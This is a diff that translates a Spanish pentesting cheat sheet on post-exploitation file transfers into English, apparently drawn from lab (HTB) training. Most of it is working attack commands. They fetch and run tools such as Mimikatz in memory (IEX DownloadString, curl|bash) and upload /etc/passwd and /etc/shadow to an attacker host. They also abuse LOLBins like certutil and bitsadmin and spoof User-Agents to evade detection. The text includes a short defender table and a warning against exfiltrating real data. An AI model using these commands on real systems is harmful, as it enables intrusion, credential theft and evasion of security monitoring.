@@ -1,52 +1,41 @@
 ---
 title: "File Transfers"
-description: "Windows/Linux, PowerShell, certutil, base64 y smbserver para post-explotación."
+description: "Windows/Linux, PowerShell, certutil, base64, and smbserver for post-exploitation."
 sidebar:
   order: 1
   label: "File Transfers"
 ---
-
-<aside class="my-8 p-5 rounded-lg border-l-4 border-[#cba6f7] bg-[#cba6f7]/5 not-prose shadow-lg backdrop-blur-sm">
-  <div class="text-xs uppercase tracking-widest text-[#cba6f7] font-bold mb-2 font-mono flex items-center gap-2">
-    <span class="inline-block w-2 h-2 rounded-full bg-[#cba6f7] animate-pulse"></span>
-    Language Fallback · Contenido en Español
-  </div>
-  <p class="text-sm text-zinc-300 leading-relaxed">
-    This methodology cheatsheet is currently written in Spanish. Technical command syntaxes, cheatsheets, and checklists remain highly readable. You can switch back to Spanish at any time using the language toggle above.
-  </p>
-</aside>
-
-> Transferencia de archivos en todos los escenarios de pentest: Windows ↔ Linux, métodos HTTP/SMB/FTP/nc/SCP, LOLBins, cifrado y evasión de detección.
+> File transfer in all pentesting scenarios: Windows ↔ Linux, HTTP/SMB/FTP/nc/SCP methods, LOLBins, encryption, and detection evasion.
 
 ---
 
 
-## Windows — Descargar a Target (desde Pwnbox)
+## Windows — Downloading to Target (from Pwnbox)
 
-### PowerShell — Base64 (sin red)
+### PowerShell — Base64 (No Network)
 
 ```bash
-# Pwnbox: codificar archivo
+# Pwnbox: encode file
 cat id_rsa | base64 -w 0; echo
-md5sum id_rsa    # verificar hash antes
+md5sum id_rsa    # verify hash beforehand
 ```
 
 ```powershell
-# Windows: decodificar y guardar
+# Windows: decode and save
 [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<BASE64_STRING>"))
-Get-FileHash C:\Users\Public\id_rsa -Algorithm md5   # verificar hash
+Get-FileHash C:\Users\Public\id_rsa -Algorithm md5   # verify hash
 ```
 
-> ⚠️ cmd.exe tiene límite de 8191 caracteres. Si el string es muy largo, usar otro método.
+> ⚠️ cmd.exe has an 8191-character limit. If the string is too long, use another method.
 
 ### PowerShell — WebClient (HTTP/HTTPS/FTP)
 
 ```powershell
-# DownloadFile — guarda en disco
+# DownloadFile — saves to disk
 (New-Object Net.WebClient).DownloadFile('http://10.10.14.1:8000/PowerView.ps1','C:\Users\Public\PowerView.ps1')
 (New-Object Net.WebClient).DownloadFileAsync('http://10.10.14.1:8000/PowerView.ps1','C:\Users\Public\PowerView.ps1')
 
-# DownloadString — fileless (ejecuta en memoria sin tocar disco)
+# DownloadString — fileless (runs in memory without touching disk)
 IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.1:8000/Invoke-Mimikatz.ps1')
 (New-Object Net.WebClient).DownloadString('http://10.10.14.1:8000/PowerUp.ps1') | IEX
 
@@ -63,18 +52,18 @@ Invoke-WebRequest https://<IP>/PowerView.ps1 -UseBasicParsing | IEX
 ### SMB — impacket-smbserver
 
 ```bash
-# Pwnbox: crear share (sin auth — puede fallar en Windows modernos)
+# Pwnbox: create share (without auth — may fail on modern Windows)
 sudo impacket-smbserver share -smb2support /tmp/smbshare
 
-# Pwnbox: crear share con credenciales (para Windows que bloquea guest)
+# Pwnbox: create share with credentials (for Windows that blocks guest)
 sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
 ```
 
 ```cmd
-:: Windows: copiar desde share anónimo
+:: Windows: copy from anonymous share
 copy \\10.10.14.1\share\nc.exe
 
-:: Windows: montar share con credenciales
+:: Windows: mount share with credentials
 net use n: \\10.10.14.1\share /user:test test
 copy n:\nc.exe
 ```
@@ -82,18 +71,18 @@ copy n:\nc.exe
 ### FTP — pyftpdlib
 
 ```bash
-# Pwnbox: servidor FTP anónimo
+# Pwnbox: anonymous FTP server
 sudo pip3 install pyftpdlib
 sudo python3 -m pyftpdlib --port 21
 ```
 
 ```powershell
-# Windows: descargar via PowerShell
+# Windows: download via PowerShell
 (New-Object Net.WebClient).DownloadFile('ftp://10.10.14.1/nc.exe', 'C:\Users\Public\nc.exe')
 ```
 
 ```cmd
-:: Windows: cliente FTP en shell no interactiva
+:: Windows: FTP client in a non-interactive shell
 echo open 10.10.14.1 > ftpcommand.txt
 echo USER anonymous >> ftpcommand.txt
 echo binary >> ftpcommand.txt
@@ -104,45 +93,45 @@ ftp -v -n -s:ftpcommand.txt
 
 ---
 
-## Windows — Subir desde Target (a Pwnbox)
+## Windows — Uploading from Target (to Pwnbox)
 
-### PowerShell — Base64 hacia Pwnbox
+### PowerShell — Base64 to Pwnbox
 
 ```powershell
-# Codificar en Windows
+# Encode in Windows
 [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
 Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
 ```
 
 ```bash
-# Pwnbox: decodificar
+# Pwnbox: decode
 echo "<BASE64>" | base64 -d > hosts
-md5sum hosts    # verificar
+md5sum hosts    # verify
 ```
 
 ### HTTP Upload — uploadserver
 
 ```bash
-# Pwnbox: instalar y lanzar servidor con upload
+# Pwnbox: install and start server with upload
 pip3 install uploadserver
 python3 -m uploadserver
-# UI en http://0.0.0.0:8000/upload
+# UI at http://0.0.0.0:8000/upload
 ```
 
 ```powershell
-# Windows: subir con PSUpload.ps1
+# Windows: upload with PSUpload.ps1
 IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.1:8000/PSUpload.ps1')
 Invoke-FileUpload -Uri http://10.10.14.1:8000/upload -File C:\Windows\System32\drivers\etc\hosts
 ```
 
 ```powershell
-# Alternativa: base64 vía POST a nc listener
+# Alternative: base64 via POST to nc listener
 $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
 Invoke-WebRequest -Uri http://10.10.14.1:8000/ -Method POST -Body $b64
 ```
 
 ```bash
-# Pwnbox: capturar con nc + decodificar
+# Pwnbox: capture with nc + decode
 nc -lvnp 8000
 echo <base64> | base64 -d -w 0 > hosts
 ```
@@ -150,13 +139,13 @@ echo <base64> | base64 -d -w 0 > hosts
 ### SMB Upload — WebDAV (SMB over HTTP)
 
 ```bash
-# Pwnbox: instalar y lanzar WebDAV
+# Pwnbox: install and start WebDAV
 sudo pip3 install wsgidav cheroot
 sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
 ```
 
 ```cmd
-:: Windows: conectar y subir
+:: Windows: connect and upload
 dir \\10.10.14.1\DavWWWRoot
 copy C:\Users\john\Desktop\archivo.zip \\10.10.14.1\DavWWWRoot\
 copy C:\Users\john\Desktop\archivo.zip \\10.10.14.1\sharefolder\
@@ -165,17 +154,17 @@ copy C:\Users\john\Desktop\archivo.zip \\10.10.14.1\sharefolder\
 ### FTP Upload
 
 ```bash
-# Pwnbox: servidor FTP con escritura
+# Pwnbox: FTP server with write permissions
 sudo python3 -m pyftpdlib --port 21 --write
 ```
 
 ```powershell
-# Windows: subir
+# Windows: upload
 (New-Object Net.WebClient).UploadFile('ftp://10.10.14.1/hosts', 'C:\Windows\System32\drivers\etc\hosts')
 ```
 
 ```cmd
-:: Cliente FTP no interactivo — subida
+:: Non-interactive FTP client — upload
 echo open 10.10.14.1 > ftpcommand.txt
 echo USER anonymous >> ftpcommand.txt
 echo binary >> ftpcommand.txt
@@ -186,18 +175,18 @@ ftp -v -n -s:ftpcommand.txt
 
 ---
 
-## Linux — Descargar a Target (desde Pwnbox)
+## Linux — Downloading to Target (from Pwnbox)
 
-### Base64 (sin red)
+### Base64 (No Network)
 
 ```bash
-# Pwnbox: codificar
+# Pwnbox: encode
 cat id_rsa | base64 -w 0; echo
 md5sum id_rsa
 
-# Target Linux: decodificar
+# Target Linux: decode
 echo -n '<BASE64>' | base64 -d > id_rsa
-md5sum id_rsa    # verificar
+md5sum id_rsa    # verify
 ```
 
 ### wget / curl
@@ -207,14 +196,14 @@ wget http://10.10.14.1:8000/LinEnum.sh -O /tmp/LinEnum.sh
 curl -o /tmp/LinEnum.sh http://10.10.14.1:8000/LinEnum.sh
 ```
 
-### Fileless — ejecutar sin tocar disco
+### Fileless — Run Without Touching Disk
 
 ```bash
 curl http://10.10.14.1:8000/LinEnum.sh | bash
 wget -qO- http://10.10.14.1:8000/script.py | python3
 ```
 
-### /dev/tcp — Bash puro (sin herramientas externas)
+### /dev/tcp — Pure Bash (No External Tools)
 
 ```bash
 exec 3<>/dev/tcp/10.10.14.1/80
@@ -225,14 +214,14 @@ cat <&3
 ### SCP
 
 ```bash
-# Habilitar SSH en Pwnbox primero
+# Enable SSH on Pwnbox first
 sudo systemctl enable ssh && sudo systemctl start ssh
 
-# Target: descargar desde Pwnbox
-scp usuario@10.10.14.1:/root/herramienta.sh .
+# Target: download from Pwnbox
+scp user@10.10.14.1:/root/tool.sh .
 ```
 
-### One-liners con lenguajes
+### Language One-liners
 
 ```bash
 # Python3
@@ -254,30 +243,30 @@ perl -e 'use LWP::Simple; getstore("http://10.10.14.1:8000/LinEnum.sh", "LinEnum
 
 ---
 
-## Linux — Subir desde Target (a Pwnbox)
+## Linux — Uploading from Target (to Pwnbox)
 
-### HTTP Upload — uploadserver con HTTPS
+### HTTP Upload — uploadserver with HTTPS
 
 ```bash
-# Pwnbox: certificado self-signed + servidor HTTPS
+# Pwnbox: self-signed certificate + HTTPS server
 openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
 mkdir https && cd https
 sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
 
-# Target: subir archivos
+# Target: upload files
 curl -X POST https://10.10.14.1/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
 ```
 
-### Servidor web en target → pull desde Pwnbox
+### Web Server on Target → Pull from Pwnbox
 
 ```bash
-# Target: levantar servidor
+# Target: start server
 python3 -m http.server 8000
 python2.7 -m SimpleHTTPServer 8000
 php -S 0.0.0.0:8000
 ruby -run -ehttpd . -p8000
 
-# Pwnbox: descargar el archivo
+# Pwnbox: download the file
 wget http://<TARGET_IP>:8000/archivo.txt
 ```
 
@@ -287,7 +276,7 @@ wget http://<TARGET_IP>:8000/archivo.txt
 scp /etc/passwd htb-student@10.10.14.1:/home/htb-student/
 ```
 
-### Python3 upload one-liner
+### Python3 Upload One-liner
 
 ```bash
 python3 -c 'import requests;requests.post("http://10.10.14.1:8000/upload",files={"files":open("/etc/passwd","rb")})'
@@ -295,54 +284,54 @@ python3 -c 'import requests;requests.post("http://10.10.14.1:8000/upload",files=
 
 ---
 
-## Métodos Misceláneos
+## Miscellaneous Methods
 
-### Netcat / Ncat — transferencia directa
+### Netcat / Ncat — Direct Transfer
 
 ```bash
-# Opción A: target escucha, Pwnbox envía
-## Target (recibe)
+# Option A: Target listens, Pwnbox sends
+## Target (receives)
 nc -l -p 8000 > archivo.exe
 ncat -l -p 8000 --recv-only > archivo.exe
 
-## Pwnbox (envía)
+## Pwnbox (sends)
 nc -q 0 <TARGET_IP> 8000 < archivo.exe
 ncat --send-only <TARGET_IP> 8000 < archivo.exe
 
-# Opción B: Pwnbox escucha, target conecta (útil si firewall bloquea inbound en target)
-## Pwnbox (escucha + envía)
+# Option B: Pwnbox listens, target connects (useful if firewall blocks inbound on target)
+## Pwnbox (listens + sends)
 sudo nc -l -p 443 -q 0 < archivo.exe
 sudo ncat -l -p 443 --send-only < archivo.exe
 
-## Target (conecta + recibe)
+## Target (connects + receives)
 nc 10.10.14.1 443 > archivo.exe
 ncat 10.10.14.1 443 --recv-only > archivo.exe
-cat < /dev/tcp/10.10.14.1/443 > archivo.exe   # sin nc
+cat < /dev/tcp/10.10.14.1/443 > archivo.exe   # without nc
 ```
 
-### PowerShell Remoting (WinRM — Windows a Windows)
+### PowerShell Remoting (WinRM — Windows to Windows)
 
 ```powershell
-# Verificar conectividad WinRM
+# Verify WinRM connectivity
 Test-NetConnection -ComputerName DATABASE01 -Port 5985
 
-# Crear sesión
+# Create session
 $Session = New-PSSession -ComputerName DATABASE01
 
-# Copiar hacia la sesión remota
+# Copy to the remote session
 Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
 
-# Copiar desde la sesión remota
+# Copy from the remote session
 Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
 ```
 
-### RDP — montar carpeta local
+### RDP — Mounting a Local Folder
 
 ```bash
-# Linux → Windows vía xfreerdp (carpeta local disponible en \\tsclient\linux)
+# Linux → Windows via xfreerdp (local folder available at \\tsclient\linux)
 xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/user/htb/filetransfer
 
-# Linux → Windows vía rdesktop
+# Linux → Windows via rdesktop
 rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
 ```
 
@@ -351,11 +340,11 @@ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/ho
 ## LOLBins — Windows (LOLBAS)
 
 ```powershell
-# certutil — download (detectable por AMSI)
+# certutil — download (detectable by AMSI)
 certutil.exe -verifyctl -split -f http://10.10.14.1:8000/nc.exe
 certutil -urlcache -split -f http://10.10.14.1:8000/nc.exe
 
-# certutil — upload (via POST a nc)
+# certutil — upload (via POST to nc)
 certreq.exe -Post -config http://10.10.14.1:8000/ c:\windows\win.ini
 
 # bitsadmin — download
@@ -365,78 +354,78 @@ bitsadmin /transfer wcb /priority foreground http://10.10.14.1:8000/nc.exe C:\Te
 Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.14.1:8000/nc.exe" -Destination "C:\Temp\nc.exe"
 
 # JavaScript (cscript) — download
-# Crear wget.js con el script y ejecutar:
+# Create wget.js with the script and run:
 cscript.exe /nologo wget.js http://10.10.14.1:8000/PowerView.ps1 PowerView.ps1
 
 # VBScript (cscript) — download
-# Crear wget.vbs con el script y ejecutar:
+# Create wget.vbs with the script and run:
 cscript.exe /nologo wget.vbs http://10.10.14.1:8000/PowerView.ps1 PowerView2.ps1
 
-# GfxDownloadWrapper.exe (Intel GPU driver — si está presente)
+# GfxDownloadWrapper.exe (Intel GPU driver — if present)
 GfxDownloadWrapper.exe "http://10.10.14.1:8000/mimikatz.exe" "C:\Temp\nc.exe"
 ```
 
-> Referencia completa: lolbas-project.github.io — buscar `/download` o `/upload`
+> Full reference: lolbas-project.github.io — search for `/download` or `/upload`
 
 ## GTFOBins — Linux
 
 ```bash
-# openssl — transfer cifrado (nc-style)
-## Pwnbox: servidor SSL
+# openssl — encrypted transfer (nc-style)
+## Pwnbox: SSL server
 openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
 openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
 
-## Target: cliente SSL
+## Target: SSL client
 openssl s_client -connect 10.10.14.1:80 -quiet > LinEnum.sh
 ```
 
-> Referencia completa: gtfobins.github.io — buscar `+file download` o `+file upload`
+> Full reference: gtfobins.github.io — search for `+file download` or `+file upload`
 
 ---
 
-## Cifrado de Archivos
+## File Encryption
 
 ### Windows — Invoke-AESEncryption.ps1
 
 ```powershell
-# Importar script
+# Import script
 Import-Module .\Invoke-AESEncryption.ps1
 
-# Cifrar archivo (genera .aes)
+# Encrypt file (generates .aes)
 Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd_fuerte" -Path .\scan-results.txt
 
-# Descifrar
+# Decrypt
 Invoke-AESEncryption -Mode Decrypt -Key "p4ssw0rd_fuerte" -Path .\scan-results.txt.aes
 ```
 
 ### Linux — openssl enc
 
 ```bash
-# Cifrar
+# Encrypt
 openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
 
-# Descifrar
+# Decrypt
 openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
 ```
 
 ---
 
-## Evasión de Detección
+## Detection Evasion
 
-### Cambiar User-Agent en PowerShell
+### Change User-Agent in PowerShell
 
 ```powershell
-# Listar User-Agents disponibles
+# List available User-Agents
 [Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
 
-# Usar User-Agent de Chrome
+# Use Chrome User-Agent
 $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
 Invoke-WebRequest http://10.10.14.1:8000/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
 ```
 
-### User-Agents detectables (para defenders)
+### Detectable User-Agents (for Defenders)
 
-| Herramienta | User-Agent en servidor |
+| Tool | User-Agent on Server |
 |-------------|----------------------|
 | PowerShell `Invoke-WebRequest` | `WindowsPowerShell/5.1.XXXXX` |
 | `certutil` | `Microsoft-CryptoAPI/10.0` |
@@ -449,25 +438,25 @@ Invoke-WebRequest http://10.10.14.1:8000/nc.exe -UserAgent $UserAgent -OutFile "
 
 ## Pitfalls / Gotchas
 
-- **Verificar MD5** siempre: `md5sum` (Linux) / `Get-FileHash -Algorithm md5` (Windows). Transferencias corruptas pasan desapercibidas y luego fallan misteriosamente.
-- **Base64 con archivos binarios** en cmd.exe está limitado a 8191 caracteres. Usar PowerShell o método de red para binarios grandes.
-- **impacket-smbserver anónimo** es bloqueado por Windows 10/11 modernos. Usar `-user test -password test` y montar con `net use`.
-- **pyftpdlib** en puerto 21 requiere `sudo`. Sin `--write`, las subidas fallan silenciosamente.
-- **WebDAV keyword `DavWWWRoot`** es especial — reconocido por el Mini-Redirector driver. No es un directorio real en el servidor.
-- **certutil** es detectado por AMSI como uso malicioso. Alternar con bitsadmin o LOLBins menos conocidos si hay EDR.
-- **Fileless con IEX/curl|bash** deja rastros en memoria y en logs del proceso aunque no toque disco.
-- **No exfiltrar PII/datos sensibles reales** — crear archivos dummy para testear DLP. Exfiltrar datos reales puede tener consecuencias legales.
-- **RDP /drive:** hace que la carpeta sea accesible en `\\tsclient\<nombre>` — no es visible para otros usuarios en el host RDP.
-- **SCP con clave robada** → siempre `chmod 600 id_rsa` antes de usarla.
-- **uploadserver con HTTP** envía archivos en claro. Usar HTTPS con certificado cuando el contenido es sensible.
+- Always **verify MD5**: `md5sum` (Linux) / `Get-FileHash -Algorithm md5` (Windows). Corrupted transfers go unnoticed and then fail mysteriously.
+- **Base64 with binary files** in cmd.exe is limited to 8191 characters. Use PowerShell or a network method for large binaries.
+- **Anonymous impacket-smbserver** is blocked by modern Windows 10/11. Use `-user test -password test` and mount with `net use`.
+- **pyftpdlib** on port 21 requires `sudo`. Without `--write`, uploads will fail silently.
+- **WebDAV keyword `DavWWWRoot`** is special — recognized by the Mini-Redirector driver. It is not a real directory on the server.
+- **certutil** is detected by AMSI as malicious use. Alternate with bitsadmin or less common LOLBins if an EDR is present.
+- **Fileless with IEX/curl|bash** leaves traces in memory and process logs even if it does not touch the disk.
+- **Do not exfiltrate actual PII/sensitive data** — create dummy files to test DLP. Exfiltrating real data can have legal consequences.
+- **RDP /drive:** makes the folder accessible at `\\tsclient\<name>` — it is not visible to other users on the RDP host.
+- **SCP with a stolen key** → always `chmod 600 id_rsa` before using it.
+- **uploadserver with HTTP** sends files in the clear. Use HTTPS with a certificate when the content is sensitive.
 
 ---
 
-## Cheatsheets relacionados
+## Related Cheatsheets
 
-- [Shells & Payloads](/en/metodologias/exploitation/shells-payloads/) — Transferir payloads y establecer reverse shells
-- [Linux Privilege Escalation](/en/metodologias/privesc/linux-privilege-escalation/) — Transferir linpeas.sh al target
-- [Windows Privilege Escalation](/en/metodologias/privesc/windows-privilege-escalation/) — Transferir winPEAS, PowerUp al target
-- [Pivoting, Tunneling, and Port Forwarding](/en/metodologias/pivoting/pivoting-tunneling-port-forwarding/) — Transferir a través de pivots
-- [Active Directory Enumeration & Attacks](/en/metodologias/active-directory/active-directory-enumeration-attacks/) — Exfiltrar NTDS.dit, BloodHound data
-- [Getting Started](/en/metodologias/fundamentos/getting-started/) — Transferencias básicas y python http.server
+- [Shells & Payloads](/en/metodologias/exploitation/shells-payloads/) — Transfer payloads and establish reverse shells
+- [Linux Privilege Escalation](/en/metodologias/privesc/linux-privilege-escalation/) — Transfer linpeas.sh to the target
+- [Windows Privilege Escalation](/en/metodologias/privesc/windows-privilege-escalation/) — Transfer winPEAS, PowerUp to the target
+- [Pivoting, Tunneling, and Port Forwarding](/en/metodologias/pivoting/pivoting-tunneling-port-forwarding/) — Transfer through pivots
+- [Active Directory Enumeration & Attacks](/en/metodologias/active-directory/active-directory-enumeration-attacks/) — Exfiltrate NTDS.dit, BloodHound data
+- [Getting Started](/en/metodologias/fundamentos/getting-started/) — Basic transfers and python http.server
